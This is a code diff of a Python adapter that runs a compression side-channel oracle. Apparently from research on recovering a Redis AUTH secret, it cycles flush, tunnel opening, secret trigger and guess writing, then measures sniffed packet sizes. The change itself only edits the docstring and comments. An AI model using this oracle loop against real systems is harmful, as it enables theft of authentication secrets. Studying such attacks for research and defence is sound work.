@@ -1,11 +1,11 @@
-"""Direct-TCP adapter.
+"""Direct-injection adapter (Section 5.1).
 
-Ordering per oracle query (preserved from attacker/attack.py):
-  1. Flush — throwaway connection, `flush_bytes` random bytes.
-  2. Open the measure tunnel — CHANNEL_OPEN enters the compressor
-     before the secret.
+Ordering per oracle query:
+  1. Flush -- throwaway connection, `flush_bytes` random bytes.
+  2. Open the measure tunnel before the secret so CHANNEL_OPEN enters the
+     compressor before the secret transmission.
   3. Settle so CHANNEL_OPEN reaches the sniffer.
-  4. Trigger Redis AUTH — secret enters compressor right before the guess.
+  4. Trigger Redis AUTH -- secret enters compressor right before the guess.
   5. Settle.
   6. Clear packet log.
   7. Write guess on the measure tunnel.
@@ -52,7 +52,6 @@ class DirectAdapter:
         cfg = self._config
         assert cfg is not None and self._session is not None
 
-        # 1. Flush (throwaway connection)
         if cfg.flush_bytes > 0:
             flush_data = _flush_payload(cfg)
             try:
@@ -64,18 +63,15 @@ class DirectAdapter:
         if cfg.settle > 0:
             await asyncio.sleep(cfg.settle)
 
-        # 2-3. Open measure tunnel, let CHANNEL_OPEN settle
         _, mw = await _open_tunnel()
         if cfg.settle > 0:
             await asyncio.sleep(cfg.settle)
 
-        # 4-5. Refresh secret
         async with self._session.post(f"{CLIENT_BASE}/send_secret") as r:
             await r.read()
         if cfg.settle > 0:
             await asyncio.sleep(cfg.settle)
 
-        # 6-9. Clear, guess, settle, read
         self._packet_log.clear()
         mw.write(prefix + candidate + alignment)
         await mw.drain()
@@ -119,10 +115,6 @@ class DirectAdapter:
             label="direct-default",
         )
 
-
-# ---------------------------------------------------------------------------
-# Module helpers
-# ---------------------------------------------------------------------------
 
 async def _open_tunnel(retries: int = 20, delay: float = 1.0) -> tuple:
     for attempt in range(1, retries + 1):
